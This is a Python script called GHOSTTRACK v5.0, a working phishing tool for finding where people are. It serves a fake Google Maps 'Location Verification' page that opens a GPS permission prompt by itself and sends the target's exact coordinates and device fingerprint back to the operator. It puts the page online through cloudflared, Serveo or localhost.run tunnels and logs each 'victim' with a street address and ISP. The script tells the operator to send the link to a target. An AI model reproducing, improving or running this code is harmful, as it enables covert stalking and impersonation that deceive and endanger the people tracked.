#!/usr/bin/env python3
"""
GHOSTTRACK v5.0 - Precision Geolocation Framework
Cloudflared Tunnel | Serveo Fallback | Modern Terminal UI
Zero Click GPS Capture | Auto Popup Modal
"""

import os
import sys
import json
import threading
import subprocess
import time
import socket
import zipfile
import re
import shutil
import tarfile
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests

# ============================================================
# COLOR / STYLING SETUP
# ============================================================
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    C = Fore
    B = Back
    S = Style
except ImportError:
    class Dummy:
        def __getattr__(self, name): return ''
    C = B = S = Dummy()

try:
    from pyfiglet import Figlet
    FIGLET = True
except ImportError:
    FIGLET = False

# ============================================================
# CONFIGURATION
# ============================================================
PORT = 8080
LOG_FILE = "ghosttrack_victims.json"
TOOLS_DIR = os.path.join(os.path.expanduser("~"), ".ghosttrack")

# ============================================================
# PREMIUM LANDING PAGE - Auto GPS Modal
# ============================================================
LANDING_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps — Location Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0a16;
            --blue: #4285f4;
            --blue-dark: #1a73e8;
            --red: #ea4335;
            --green: #34a853;
            --yellow: #fbbc04;
            --text: #e8eaed;
            --text-secondary: #9aa0a6;
            --card-bg: rgba(18,18,38,0.92);
            --border: rgba(255,255,255,0.08);
        }
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Google Sans','Inter',-apple-system,sans-serif;
            background:var(--bg);
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            overflow:hidden;
        }
        /* Animated background */
        .bg-orbs{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
        .orb{
            position:absolute;
            border-radius:50%;
            filter:blur(140px);
            opacity:0.22;
            animation:float 24s infinite ease-in-out;
        }
        .orb:nth-child(1){width:600px;height:600px;background:var(--blue);top:-20%;left:-14%;animation-delay:0s}
        .orb:nth-child(2){width:450px;height:450px;background:#7b1fa2;bottom:-20%;right:-12%;animation-delay:-9s}
        .orb:nth-child(3){width:400px;height:400px;background:var(--red);top:60%;left:60%;animation-delay:-17s}
        .orb:nth-child(4){width:300px;height:300px;background:var(--yellow);top:20%;right:20%;animation-delay:-5s;opacity:0.12}
        @keyframes float{
            0%,100%{transform:translate(0,0) scale(1)}
            25%{transform:translate(80px,-100px) scale(1.15)}
            50%{transform:translate(-60px,80px) scale(0.85)}
            75%{transform:translate(-90px,-60px) scale(1.08)}
        }
        /* Modal */
        .overlay{
            position:fixed;
            top:0;left:0;
            width:100%;height:100%;
            background:rgba(0,0,0,0.78);
            z-index:999;
            display:flex;
            justify-content:center;
            align-items:center;
            backdrop-filter:blur(5px);
            -webkit-backdrop-filter:blur(5px);
        }
        .modal{
            background:var(--card-bg);
            backdrop-filter:blur(60px);
            -webkit-backdrop-filter:blur(60px);
            border:1px solid var(--border);
            border-radius:26px;
            padding:38px 30px 30px;
            max-width:430px;
            width:92%;
            text-align:center;
            box-shadow:
                0 24px 70px rgba(0,0,0,0.8),
                0 0 0 1px rgba(255,255,255,0.03) inset,
                0 0 120px rgba(66,133,244,0.08);
            animation:slideUp 0.45s cubic-bezier(0.16,1,0.3,1);
        }
        @keyframes slideUp{
            from{transform:translateY(40px);opacity:0}
            to{transform:translateY(0);opacity:1}
        }
        .pin-icon{
            width:72px;height:72px;
            background:linear-gradient(145deg,#4285f4,#1a73e8);
            border-radius:50%;
            display:inline-flex;
            align-items:center;
            justify-content:center;
            margin-bottom:20px;
            box-shadow:0 14px 36px rgba(26,115,232,0.45);
            animation:pulse-pin 2.2s infinite;
            position:relative;
        }
        .pin-icon::after{
            content:'';
            position:absolute;
            width:100%;height:100%;
            border-radius:50%;
            border:2px solid rgba(66,133,244,0.5);
            animation:ripple 2.2s infinite;
        }
        @keyframes pulse-pin{
            0%,100%{box-shadow:0 14px 36px rgba(26,115,232,0.45)}
            50%{box-shadow:0 14px 56px rgba(26,115,232,0.75)}
        }
        @keyframes ripple{
            0%{transform:scale(1);opacity:0.6}
            100%{transform:scale(1.8);opacity:0}
        }
        .pin-icon svg{width:36px;height:36px;position:relative;z-index:1}
        .domain-tag{
            display:inline-block;
            background:rgba(66,133,244,0.1);
            color:#8ab4f8;
            font-size:11.5px;
            padding:5px 14px;
            border-radius:50px;
            margin-bottom:16px;
            font-weight:500;
            letter-spacing:0.2px;
        }
        .modal h2{
            font-size:23px;
            font-weight:700;
            color:var(--text);
            margin-bottom:6px;
            letter-spacing:-0.5px;
        }
        .modal .desc{
            font-size:13.5px;
            color:var(--text-secondary);
            line-height:1.65;
            margin-bottom:20px;
        }
        .privacy-row{
            display:flex;
            align-items:center;
            justify-content:center;
            gap:8px;
            font-size:11.5px;
            color:rgba(255,255,255,0.35);
            margin-bottom:26px;
        }
        .privacy-row .dot{width:6px;height:6px;background:var(--green);border-radius:50%}
        .btn-allow{
            display:block;
            width:100%;
            background:linear-gradient(135deg,#4285f4,#1a73e8);
            color:#fff;
            border:none;
            padding:16px;
            font-size:16px;
            font-weight:600;
            border-radius:15px;
            cursor:pointer;
            letter-spacing:-0.2px;
            transition:all 0.25s cubic-bezier(0.4,0,0.2,1);
            box-shadow:0 8px 28px rgba(26,115,232,0.4);
            font-family:inherit;
        }
        .btn-allow:hover{
            transform:translateY(-2px);
            box-shadow:0 14px 36px rgba(26,115,232,0.55);
        }
        .btn-allow:active{transform:scale(0.96)}
        .btn-deny{
            display:block;
            width:100%;
            background:transparent;
            color:rgba(255,255,255,0.35);
            border:1px solid rgba(255,255,255,0.06);
            padding:13px;
            font-size:14px;
            font-weight:500;
            border-radius:15px;
            cursor:pointer;
            margin-top:10px;
            transition:all 0.2s;
            font-family:inherit;
        }
        .btn-deny:hover{background:rgba(255,255,255,0.02);color:rgba(255,255,255,0.55)}
        /* States */
        .loading-state{display:none;text-align:center;padding:20px 0}
        .loading-state.active{display:block}
        .spinner{
            width:46px;height:46px;
            border:3px solid rgba(255,255,255,0.05);
            border-top-color:var(--blue);
            border-radius:50%;
            animation:spin 0.7s linear infinite;
            margin:0 auto 14px;
        }
        @keyframes spin{to{transform:rotate(360deg)}}
        .loading-text{font-size:14px;color:var(--text-secondary)}
        .success-state{display:none;text-align:center;padding:20px 0}
        .success-state.active{display:block}
        .check-circle{
            width:66px;height:66px;
            background:rgba(52,168,83,0.12);
            border:2px solid rgba(52,168,83,0.3);
            border-radius:50%;
            display:inline-flex;
            align-items:center;
            justify-content:center;
            margin-bottom:14px;
            animation:popIn 0.5s cubic-bezier(0.16,1,0.3,1);
        }
        @keyframes popIn{
            0%{transform:scale(0);opacity:0}
            80%{transform:scale(1.08)}
            100%{transform:scale(1);opacity:1}
        }
        .check-circle svg{width:32px;height:32px}
        .success-title{font-size:18px;font-weight:600;color:var(--green);margin-bottom:4px}
        .success-sub{font-size:13px;color:var(--text-secondary)}
        .error-state{display:none;text-align:center;padding:20px 0}
        .error-state.active{display:block}
        .error-box{
            background:rgba(234,67,53,0.07);
            border:1px solid rgba(234,67,53,0.25);
            border-radius:14px;
            padding:14px 18px;
            color:#f28b82;
            font-size:13px;
            margin-top:10px;
            line-height:1.5;
        }
        .retry-link{
            color:#8ab4f8;
            cursor:pointer;
            text-decoration:underline;
            font-size:13px;
            margin-top:12px;
            display:inline-block;
            font-weight:500;
        }
        .footer-note{
            text-align:center;
            padding:18px;
            font-size:10.5px;
            color:rgba(255,255,255,0.18);
            position:fixed;
            bottom:0;
            width:100%;
        }
    </style>
</head>
<body>

<div class="bg-orbs">
    <div class="orb"></div>
    <div class="orb"></div>
    <div class="orb"></div>
    <div class="orb"></div>
</div>

<div class="overlay" id="gpsOverlay">
    <div class="modal" id="gpsModal">
        <div class="pin-icon">
            <svg viewBox="0 0 24 24" fill="none">
                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z" fill="#fff"/>
                <circle cx="12" cy="9" r="3" fill="#1a73e8"/>
            </svg>
        </div>
        <div class="domain-tag" id="domainDisplay">📍 maps.google.com</div>
        <h2>Allow Location Access</h2>
        <p class="desc">Google Maps requires your precise device location to verify your delivery address and provide accurate navigation.</p>
        <div class="privacy-row">
            <span class="dot"></span> Encrypted & used only for this session
        </div>
        <button class="btn-allow" onclick="requestGPS()">
            📍 Allow Once
        </button>
        <button class="btn-deny" onclick="handleDeny()">
            Not Now
        </button>

        <div class="loading-state" id="loadingState">
            <div class="spinner"></div>
            <p class="loading-text">Acquiring GPS coordinates...</p>
        </div>

        <div class="success-state" id="successState">
            <div class="check-circle">
                <svg viewBox="0 0 24 24" fill="none" stroke="#34a853" stroke-width="2.8">
                    <polyline points="4 12 10 18 20 6"/>
                </svg>
            </div>
            <p class="success-title">Location Verified</p>
            <p class="success-sub">Your delivery is being processed.</p>
        </div>

        <div class="error-state" id="errorState">
            <div class="error-box" id="errorMsg">
                ⚠️ Unable to access location. Please check your settings.
            </div>
            <span class="retry-link" onclick="requestGPS()">↻ Tap to Retry</span>
        </div>
    </div>
</div>

<div class="footer-note">Google Maps ©2024 • Location Services</div>

<script>
document.getElementById('domainDisplay').innerText = '📍 ' + window.location.hostname;

setTimeout(function(){
    requestGPS();
}, 800);

function requestGPS(){
    document.getElementById('loadingState').classList.add('active');
    document.getElementById('successState').classList.remove('active');
    document.getElementById('errorState').classList.remove('active');
    document.querySelector('.btn-allow').style.display = 'none';
    document.querySelector('.btn-deny').style.display = 'none';

    if(!navigator.geolocation){
        showError('Geolocation not supported on this device.');
        return;
    }

    navigator.geolocation.getCurrentPosition(onSuccess, onError, {
        enableHighAccuracy: true,
        timeout: 25000,
        maximumAge: 0
    });
}

function onSuccess(position){
    document.getElementById('loadingState').classList.remove('active');
    document.getElementById('successState').classList.add('active');

    fetch('/gps', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude || 'N/A',
            altitudeAccuracy: position.coords.altitudeAccuracy || 'N/A',
            speed: position.coords.speed || 'N/A',
            heading: position.coords.heading || 'N/A',
            timestamp: new Date(position.timestamp).toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenSize: screen.width + 'x' + screen.height,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cores: navigator.hardwareConcurrency || 'N/A',
            memory: navigator.deviceMemory || 'N/A',
            connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
            referrer: document.referrer || 'Direct'
        })
    }).catch(function(){});

    setTimeout(function(){
        document.getElementById('gpsOverlay').style.opacity = '0';
        document.getElementById('gpsOverlay').style.transition = 'opacity 0.7s';
        setTimeout(function(){
            document.getElementById('gpsOverlay').style.display = 'none';
        }, 700);
    }, 2800);
}

function onError(err){
    document.getElementById('loadingState').classList.remove('active');
    document.getElementById('errorState').classList.add('active');
    var msgs = {
        1: '⚠️ Location access denied. Please allow GPS permission in your browser settings and refresh.',
        2: '⚠️ GPS signal unavailable. Move to an open area with clear sky.',
        3: '⚠️ Request timed out. Check your connection and try again.'
    };
    document.getElementById('errorMsg').innerText = msgs[err.code] || '⚠️ Error occurred. Please try again.';
    document.querySelector('.btn-allow').style.display = 'block';
    document.querySelector('.btn-deny').style.display = 'block';
}

function handleDeny(){
    document.getElementById('errorState').classList.add('active');
    document.getElementById('errorMsg').innerText = '⚠️ Location access is required to verify your delivery.';
    document.querySelector('.btn-allow').style.display = 'block';
    document.querySelector('.btn-deny').style.display = 'none';
}
</script>
</body>
</html>"""

# ============================================================
# UTILITY FUNCTIONS
# ============================================================
def print_box(title, content, color=C.CYAN):
    """Print a styled box."""
    width = 62
    print(f"{color}╔{'═'*width}╗")
    print(f"{color}║ {C.WHITE}{S.BRIGHT}{title}{' '*(width-len(title)-1)}{color}║")
    print(f"{color}╠{'═'*width}╣")
    for line in content.split('\n'):
        print(f"{color}║ {C.WHITE}{line}{' '*(width-len(line)-1)}{color}║")
    print(f"{color}╚{'═'*width}╝{S.RESET_ALL}")

def print_status(icon, msg, color=C.WHITE):
    """Print a status line."""
    print(f"  {icon}  {color}{msg}{S.RESET_ALL}")

def print_success(msg):
    print_status("✅", msg, C.GREEN)

def print_error(msg):
    print_status("❌", msg, C.RED)

def print_info(msg):
    print_status("📡", msg, C.CYAN)

def print_warning(msg):
    print_status("⚠️", msg, C.YELLOW)

def reverse_geocode(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
        headers = {"User-Agent": "GhostTrack/5.0"}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.json().get("display_name", "Unknown Address")
    except:
        return "Address lookup failed"

def ip_geolocation(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=city,regionName,country,isp,org,query", timeout=5)
        data = resp.json()
        if data.get("status") == "success":
            return f"{data.get('city','?')}, {data.get('regionName','?')}, {data.get('country','?')} — {data.get('isp','?')}"
    except:
        pass
    return "Unknown"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def animate_progress(text, duration=1.5):
    """Simple progress animation."""
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        print(f"\r  {C.CYAN}{chars[i % len(chars)]}{S.RESET_ALL} {text}", end="", flush=True)
        time.sleep(0.08)
        i += 1
    print("\r  ", end="")

# ============================================================
# TUNNEL METHODS
# ============================================================
def install_cloudflared():
    """Download and install cloudflared."""
    exe_name = "cloudflared.exe" if os.name == "nt" else "cloudflared"
    exe_path = os.path.join(TOOLS_DIR, exe_name)

    if os.path.exists(exe_path):
        return exe_path

    os.makedirs(TOOLS_DIR, exist_ok=True)
    print_warning("Cloudflared not found. Downloading...")

    system = sys.platform
    if system == "win32":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    elif system == "darwin":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"
    else:
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"

    try:
        resp = requests.get(url, stream=True, timeout=120)
        total = int(resp.headers.get("content-length", 0))

        if url.endswith(".tgz"):
            tgz_path = os.path.join(TOOLS_DIR, "cloudflared.tgz")
            with open(tgz_path, "wb") as f:
                for chunk in resp.iter_content(8192):
                    f.write(chunk)
            with tarfile.open(tgz_path, "r:gz") as tar:
                tar.extract("cloudflared", TOOLS_DIR)
            os.remove(tgz_path)
        else:
            with open(exe_path, "wb") as f:
                downloaded = 0
                for chunk in resp.iter_content(8192):
                    f.write(chunk)
                    downloaded += len(chunk)
            if os.name != "nt":
                os.chmod(exe_path, 0o755)

        print_success("Cloudflared installed.")
        return exe_path
    except Exception as e:
        print_error(f"Failed to download cloudflared: {e}")
        return None

def start_cloudflared_tunnel():
    """Start cloudflared tunnel and return public URL."""
    exe = install_cloudflared()
    if not exe:
        return None

    print_info("Launching Cloudflare Tunnel...")
    animate_progress("Starting tunnel...", 1.0)

    try:
        proc = subprocess.Popen(
            [exe, "tunnel", "--url", f"http://localhost:{PORT}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        public_url = None
        start_time = time.time()
        timeout = 45

        for line in iter(proc.stdout.readline, ''):
            if time.time() - start_time > timeout:
                break

            # Cloudflared output pattern
            match = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
            if match:
                public_url = match.group(1)
                break

            # Alternative pattern
            match2 = re.search(r'https://.*?\.trycloudflare\.com', line)
            if match2:
                public_url = match2.group(0)
                break

            print(f"\r  {C.CYAN}⏳{S.RESET_ALL} Connecting...", end="", flush=True)

        print()
        if public_url:
            return public_url
        else:
            print_warning("Cloudflared started but URL not parsed. Trying Serveo...")
    except Exception as e:
        print_error(f"Cloudflared error: {e}")

    return None

def start_serveo_tunnel():
    """Start Serveo tunnel via SSH (fallback)."""
    print_info("Trying Serveo tunnel (SSH)...")
    animate_progress("Connecting to serveo.net...", 1.0)

    try:
        # Random subdomain
        import random
        subdomain = f"ghosttrack-{random.randint(1000,9999)}"

        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-R", f"{subdomain}:80:localhost:{PORT}", "serveo.net"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        public_url = f"https://{subdomain}.serveo.net"
        time.sleep(3)

        # Check if serveo is accessible
        try:
            test = requests.get(f"http://{subdomain}.serveo.net", timeout=5)
            return public_url
        except:
            pass

        # Wait for URL in output
        start = time.time()
        for line in iter(proc.stdout.readline, ''):
            if time.time() - start > 15:
                break
            if "Forwarding" in line or "serveo" in line.lower():
                match = re.search(r'https?://[^\s]+', line)
                if match:
                    return match.group(0)

    except FileNotFoundError:
        print_warning("SSH not found. Serveo requires SSH client.")
    except Exception as e:
        print_error(f"Serveo error: {e}")

    return None

def start_localhost_run():
    """Try localhost.run tunnel (another SSH-based fallback)."""
    print_info("Trying localhost.run...")
    animate_progress("Connecting...", 1.0)

    try:
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
             "-R", f"80:localhost:{PORT}", "nokey@localhost.run"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        start = time.time()
        for line in iter(proc.stdout.readline, ''):
            if time.time() - start > 20:
                break
            match = re.search(r'https?://[a-zA-Z0-9\-]+\.lhr\.life', line)
            if match:
                return match.group(0)
            match2 = re.search(r'https?://[^\s]+\.lhr\.life[^\s]*', line)
            if match2:
                return match2.group(0)

    except FileNotFoundError:
        pass
    except:
        pass

    return None

# ============================================================
# HTTP SERVER
# ============================================================
class GhostTrackHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(LANDING_PAGE.encode("utf-8"))

    def do_POST(self):
        if self.path == "/gps":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            data = json.loads(body)

            lat = data.get("latitude")
            lon = data.get("longitude")
            ip = self.client_address[0]

            print(f"\n{C.GREEN}╔{'═'*58}╗")
            print(f"{C.GREEN}║{C.RED}{S.BRIGHT}  🎯 GPS HIT RECEIVED {C.GREEN}— GHOSTTRACK v5.0              {C.GREEN}║")
            print(f"{C.GREEN}╠{'═'*58}╣")
            print(f"{C.GREEN}║{C.WHITE}  📍 Coords  : {C.YELLOW}{lat}, {lon}{' '*(34-len(f'{lat}, {lon}'))}{C.GREEN}║")
            print(f"{C.GREEN}║{C.WHITE}  🎯 Accuracy: {C.YELLOW}±{data.get('accuracy','?')}m{' '*(34-len(f'±{data.get('accuracy','?')}m'))}{C.GREEN}║")
            print(f"{C.GREEN}║{C.WHITE}  🌐 IP      : {C.YELLOW}{ip}{' '*(34-len(ip))}{C.GREEN}║")
            print(f"{C.GREEN}║{C.WHITE}  🗺️  Maps    : {C.YELLOW}google.com/maps?q={lat},{lon}{' '*(15)}{C.GREEN}║")
            print(f"{C.GREEN}╚{'═'*58}╝{S.RESET_ALL}\n")

            threading.Thread(target=save_victim_data, args=(data, ip, lat, lon), daemon=True).start()

            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())

def save_victim_data(data, ip, lat, lon):
    address = reverse_geocode(lat, lon)
    ip_info = ip_geolocation(ip)

    record = {
        "id": datetime.now().strftime("%Y%m%d%H%M%S%f"),
        "timestamp": datetime.now().isoformat(),
        "gps": {
            "latitude": lat,
            "longitude": lon,
            "accuracy_m": data.get("accuracy"),
            "altitude": data.get("altitude"),
            "speed_mps": data.get("speed"),
            "heading": data.get("heading"),
        },
        "address": address,
        "ip": ip,
        "isp": ip_info,
        "device": {
            "ua": data.get("userAgent"),
            "platform": data.get("platform"),
            "language": data.get("language"),
            "screen": data.get("screenSize"),
            "timezone": data.get("timezone"),
            "cpu": data.get("cores"),
            "ram": data.get("memory"),
            "connection": data.get("connection"),
        },
        "maps": {
            "google": f"https://www.google.com/maps?q={lat},{lon}",
            "osm": f"https://www.openstreetmap.org/?mlat={lat}&mlon={lon}",
        }
    }

    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            try:
                logs = json.load(f)
            except:
                logs = []
    logs.append(record)
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)

    print_success(f"Data saved to {LOG_FILE}")

# ============================================================
# TERMINAL UI - BANNER
# ============================================================
def show_banner():
    os.system("cls" if os.name == "nt" else "clear")

    if FIGLET:
        try:
            banner = Figlet(font='slant').renderText('GHOSTTRACK')
        except:
            banner = "GHOSTTRACK v5.0"
    else:
        banner = "GHOSTTRACK v5.0"

    print(f"""
{C.CYAN}╔{'═'*62}╗
{C.CYAN}║{C.RED}{S.BRIGHT}{banner}{C.CYAN}
{C.CYAN}║
{C.CYAN}║  {C.WHITE}{S.BRIGHT}PRECISION GEOLOCATION FRAMEWORK v5.0
{C.CYAN}║  {C.RED}🔥 ZERO CLICK • AUTO GPS POPUP • MULTI-TUNNEL 🔥
{C.CYAN}║
{C.CYAN}║  {C.YELLOW}Port : {C.WHITE}{PORT}{' '*(49)}{C.CYAN}║
{C.CYAN}║  {C.YELLOW}Log  : {C.WHITE}{LOG_FILE}{' '*(49)}{C.CYAN}║
{C.CYAN}║  {C.YELLOW}Tools: {C.WHITE}{TOOLS_DIR}{' '*(44)}{C.CYAN}║
{C.CYAN}╚{'═'*62}╝{S.RESET_ALL}
""")

def show_startup_progress():
    """Show a fake startup sequence for aesthetics."""
    steps = [
        ("Initializing HTTP server", 0.3),
        ("Loading GPS capture page", 0.2),
        ("Configuring tunnel methods", 0.3),
        ("Cloudflared Tunnel [primary]", 0.2),
        ("Serveo Tunnel [fallback]", 0.2),
        ("localhost.run [fallback]", 0.2),
    ]
    print(f"\n{C.CYAN}  ═══ STARTUP SEQUENCE ═══{S.RESET_ALL}")
    for step, delay in steps:
        animate_progress(step, delay)
        print(f"  {C.GREEN}✓{S.RESET_ALL} {step}")
    print()

# ============================================================
# MAIN
# ============================================================
def main():
    show_banner()
    show_startup_progress()

    # Start HTTP server
    print_box("SERVER STATUS", f"Starting on 0.0.0.0:{PORT}...", C.CYAN)
    server = HTTPServer(("0.0.0.0", PORT), GhostTrackHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    print_success(f"Server running on port {PORT}")
    print_info(f"Local: http://{get_local_ip()}:{PORT}")

    # Try tunnels in order
    print(f"\n{C.CYAN}  ═══ TUNNEL SETUP ═══{S.RESET_ALL}")

    public_url = None
    tunnel_method = None

    # Method 1: Cloudflared (best - no account needed)
    print_info("Method 1: Cloudflare Tunnel")
    public_url = start_cloudflared_tunnel()
    if public_url:
        tunnel_method = "Cloudflare Tunnel"
        print_success(f"Connected via {tunnel_method}")

    # Method 2: Serveo
    if not public_url:
        print_info("Method 2: Serveo SSH Tunnel")
        public_url = start_serveo_tunnel()
        if public_url:
            tunnel_method = "Serveo"
            print_success(f"Connected via {tunnel_method}")

    # Method 3: localhost.run
    if not public_url:
        print_info("Method 3: localhost.run")
        public_url = start_localhost_run()
        if public_url:
            tunnel_method = "localhost.run"
            print_success(f"Connected via {tunnel_method}")

    # Display result
    print(f"\n{C.CYAN}  ═══ RESULTS ═══{S.RESET_ALL}")
    if public_url:
        print_box("🌐 PUBLIC URL", f"{public_url}", C.GREEN)
        print(f"\n  {C.RED}{S.BRIGHT}📤 SEND THIS LINK TO TARGET:{S.RESET_ALL}")
        print(f"  {C.YELLOW}{S.BRIGHT}{public_url}{S.RESET_ALL}")
        print(f"\n  {C.WHITE}⏳ Waiting for GPS hits... {C.RED}Ctrl+C{S.RESET_ALL} {C.WHITE}to stop.{S.RESET_ALL}")
        print(f"  {C.WHITE}📁 Log: {C.CYAN}{os.path.abspath(LOG_FILE)}{S.RESET_ALL}")
    else:
        print_box("⚠️ TUNNEL FAILED", 
                  "All tunnel methods failed.\n"
                  f"Local URL: http://{get_local_ip()}:{PORT}\n"
                  "Use port forwarding or try again.", C.RED)

    print(f"\n{C.CYAN}{'─'*64}{S.RESET_ALL}\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{C.RED}  ═══ SHUTDOWN ═══{S.RESET_ALL}")
        print_info("Stopping server...")
        server.shutdown()
        print_success(f"Data saved: {os.path.abspath(LOG_FILE)}")
        print(f"{C.CYAN}  Goodbye.{S.RESET_ALL}\n")
        sys.exit(0)

if __name__ == "__main__":
    main()